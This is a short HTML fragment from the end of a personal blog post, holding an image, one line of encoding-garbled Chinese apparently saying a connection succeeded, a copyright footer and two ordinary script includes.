</span></span></code></pre></div><p><img src=https://s2.loli.net/2024/01/25/1d7k4lObgtvaXCc.png alt=image-20240125082648486></p><p>è¿æ¥æˆåŠŸï¼ğŸ”š</p></article></main><footer><p>Â© 2024 Wat4r's Blog</p></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js></script><script src=https://wat4r.github.io/js/code_header.js></script></body></html>